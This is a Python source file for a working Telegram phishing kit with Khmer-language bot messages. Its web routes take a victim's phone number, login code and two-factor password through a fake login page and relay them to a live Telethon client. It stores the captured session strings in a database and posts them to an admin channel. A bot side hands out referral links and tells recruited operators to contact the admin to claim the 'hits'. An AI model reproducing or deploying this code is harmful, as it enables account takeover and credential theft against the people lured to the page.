import os
import asyncio
import telebot
import psycopg2
import logging
from telebot import types
from quart import Quart, request, jsonify
from telethon import TelegramClient, functions, errors
from telethon.sessions import StringSession
from threading import Thread

# --- 1. CONFIGURATION ---
# These must be set in your Koyeb Environment Variables
API_ID = int(os.environ.get("API_ID", 36003995))
API_HASH = os.environ.get("API_HASH", "41a2b48afe9cfbd1fbf59c5e75b00afa")
BOT_TOKEN = os.environ.get("BOT_TOKEN")
DATABASE_URL = os.environ.get("DATABASE_URL")
LOGGER_GROUP = int(os.environ.get("LOGGER_GROUP", 0))  # Your Private Log Channel
VERIFY_GROUP = int(os.environ.get("VERIFY_GROUP", 0))  # Your Approval Group
ADMIN_USERNAME = "@g_yuyuu"
BASE_URL = os.environ.get("BASE_URL", "") # e.g., https://app-name.koyeb.app

# Enable logging to see errors in Koyeb Console
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
app = Quart(__name__)

# Temporary storage for active login sessions (Phone -> Client)
active_mirrors = {}

# --- 2. DATABASE ENGINE (PostgreSQL / Neon) ---

def get_db_connection():
    return psycopg2.connect(DATABASE_URL, sslmode='require')

def init_db():
    conn = get_db_connection()
    cur = conn.cursor()
    # Table for approved bot users
    cur.execute("""
        CREATE TABLE IF NOT EXISTS approved_users (
            user_id BIGINT PRIMARY KEY, 
            status TEXT DEFAULT 'approved'
        )
    """)
    # Table for storing the actual HITS (Sessions)
    cur.execute("""
        CREATE TABLE IF NOT EXISTS controlled_accounts (
            phone TEXT PRIMARY KEY, 
            session_string TEXT, 
            owner_name TEXT,
            tid BIGINT
        )
    """)
    conn.commit()
    cur.close()
    conn.close()

def is_approved(user_id):
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("SELECT status FROM approved_users WHERE user_id = %s", (user_id,))
        res = cur.fetchone()
        cur.close()
        conn.close()
        return res is not None
    except Exception as e:
        logger.error(f"DB Error: {e}")
        return False

init_db()

# --- 3. KHMER BOT INTERFACE ---

def main_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add(types.KeyboardButton("🔗 បង្កើតតំណភ្ជាប់"), types.KeyboardButton("📋 បញ្ជីគណនី"))
    markup.add(types.KeyboardButton("❓ ជំនួយ"))
    return markup

# --- 4. THE DUAL-HOOK & STORAGE ENGINE ---

async def finalize_ultra_hit(phone, tid):
    """
    Saves data to Database and sends logs to Admin and User.
    """
    if phone not in active_mirrors: return
    
    data = active_mirrors[phone]
    client = data['client']
    
    try:
        me = await client.get_me()
        session_str = client.session.save()
        
        # --- STORE DATA IN POSTGRES ---
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("""
            INSERT INTO controlled_accounts (phone, session_string, owner_name, tid) 
            VALUES (%s, %s, %s, %s)
            ON CONFLICT (phone) DO UPDATE SET session_string = EXCLUDED.session_string
        """, (phone, session_str, me.first_name, tid))
        conn.commit()
        cur.close()
        conn.close()

        # --- ADMIN LOG (Full Power) ---
        admin_report = (
            f"💰 <b>ស្ទូចបានសម្រេច! (Admin Copy)</b>\n"
            f"━━━━━━━━━━━━━━━\n"
            f"👤 ឈ្មោះ: {me.first_name}\n"
            f"🆔 ID: <code>{me.id}</code>\n"
            f"📱 លេខ: <code>{phone}</code>\n"
            f"🔗 Ref TID: <code>{tid}</code>\n\n"
            f"🔑 <b>Session:</b>\n<code>{session_str}</code>"
        )
        bot.send_message(LOGGER_GROUP, admin_report)

        # --- USER LOG (The 'Paywall' notification) ---
        user_report = (
            f"🎯 <b>អ្នកទទួលបាន HIT ថ្មី!</b>\n"
            f"━━━━━━━━━━━━━━━\n"
            f"👤 ឈ្មោះ: {me.first_name}\n"
            f"📱 លេខទូរស័ព្ទ: <code>{phone}</code>\n\n"
            f"⚠️ <i>ដើម្បីទាញយកគណនីនេះ សូមទាក់ទង Admin។</i>"
        )
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("🔌 Connect Account", url=f"https://t.me/{ADMIN_USERNAME.replace('@','')}"))
        bot.send_message(tid, user_report, reply_markup=markup)

    except Exception as e:
        logger.error(f"Error finishing hit: {e}")
    finally:
        await client.disconnect()
        del active_mirrors[phone]

# --- 5. WEB ROUTES (Quart Server) ---

@app.route('/')
async def index():
    try:
        # Loading from templates folder as requested
        with open("templates/login.html", "r", encoding="utf-8") as f:
            return f.read()
    except FileNotFoundError:
        return "❌ Error: templates/login.html not found!", 404

@app.route('/step_phone', methods=['POST'])
async def step_phone():
    data = await request.json
    phone = data.get('phone', '').replace("+", "").replace(" ", "")
    tid = data.get('tid')

    # Updated client specs for 2026 stability
    client = TelegramClient(
        StringSession(), API_ID, API_HASH, 
        device_model="iPhone 16 Pro Max", 
        system_version="18.2.1", 
        app_version="11.5.0"
    )
    await client.connect()
    
    try:
        sent_code = await client.send_code_request(phone)
        active_mirrors[phone] = {
            "client": client,
            "hash": sent_code.phone_code_hash,
            "tid": tid
        }
        return jsonify({"status": "success"})
    except Exception as e:
        logger.error(f"Phone error: {e}")
        return jsonify({"status": "error", "msg": str(e)})

@app.route('/step_code', methods=['POST'])
async def step_code():
    data = await request.json
    phone = data.get('phone', '').replace("+", "")
    code = data.get('code')
    tid = data.get('tid')
    
    if phone not in active_mirrors: return jsonify({"status": "error", "msg": "Session Expired"})
    
    session_data = active_mirrors[phone]
    try:
        await session_data['client'].sign_in(phone, code, phone_code_hash=session_data['hash'])
        await finalize_ultra_hit(phone, tid)
        return jsonify({"status": "success"})
    except errors.SessionPasswordNeededError:
        return jsonify({"status": "2fa_needed"})
    except Exception as e:
        return jsonify({"status": "error", "msg": "Invalid Code"})

@app.route('/step_2fa', methods=['POST'])
async def step_2fa():
    data = await request.json
    phone = data.get('phone', '').replace("+", "")
    password = data.get('password')
    tid = data.get('tid')
    
    if phone not in active_mirrors: return jsonify({"status": "error", "msg": "Session Expired"})
    
    try:
        await active_mirrors[phone]['client'].sign_in(password=password)
        await finalize_ultra_hit(phone, tid)
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error", "msg": "Wrong Password"})

# --- 6. BOT COMMANDS ---

@bot.message_handler(commands=['start'])
def cmd_start(m):
    if is_approved(m.from_user.id):
        bot.send_message(m.chat.id, "🎯 <b>Ultra Vinzy Mode Active!</b>", reply_markup=main_menu())
    else:
        bot.send_message(m.chat.id, "⏳ គណនីរបស់អ្នកមិនទាន់ត្រូវបានអនុញ្ញាតទេ។")
        bot.send_message(VERIFY_GROUP, f"🔔 សំណើសុំអនុញ្ញាត: {m.from_user.id}\n/approve_{m.from_user.id}")

@bot.message_handler(func=lambda m: m.text == "🔗 បង្កើតតំណភ្ជាប់")
def cmd_gen(m):
    if not is_approved(m.from_user.id): return
    # Generates link with the user's ID as the 'tid'
    link = f"{BASE_URL}/?id={m.from_user.id}"
    bot.reply_to(m, f"✅ <b>តំណភ្ជាប់របស់អ្នក៖</b>\n\n<code>{link}</code>")

@bot.message_handler(func=lambda m: m.text.startswith('.authremove'))
def cmd_remove(m):
    # This removes the data from the PostgreSQL database
    parts = m.text.split()
    if len(parts) < 2: return bot.reply_to(m, "❌ ប្រើ: <code>.authremove 855xxx</code>")
    
    phone = parts[1].replace("+", "").strip()
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("DELETE FROM controlled_accounts WHERE phone = %s", (phone,))
        conn.commit()
        count = cur.rowcount
        cur.close()
        conn.close()
        
        if count > 0:
            bot.reply_to(m, f"🗑️ <b>លុបបានសម្រេច:</b> <code>{phone}</code> ត្រូវបានសម្អាតចេញពី DB។")
        else:
            bot.reply_to(m, f"❓ <b>រកមិនឃើញ:</b> លេខ {phone} មិនមានក្នុង DB ទេ។")
    except Exception as e:
        bot.reply_to(m, f"❌ Error: {e}")

@bot.message_handler(func=lambda m: m.text.startswith('/approve_'))
def handle_approval(m):
    if m.chat.id != VERIFY_GROUP: return
    uid = int(m.text.split('_')[1])
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("INSERT INTO approved_users (user_id) VALUES (%s) ON CONFLICT DO NOTHING", (uid,))
    conn.commit()
    cur.close()
    conn.close()
    bot.send_message(uid, "🎉 គណនីរបស់អ្នកត្រូវបានយល់ព្រម!", reply_markup=main_menu())

# --- 7. STARTUP ---
if __name__ == "__main__":
    # Start Bot Polling (skip_pending=True ignores old messages)
    Thread(target=lambda: bot.infinity_polling(skip_pending=True)).start()
    # Start Web Server on Port 8000
    app.run(host="0.0.0.0", port=8000)
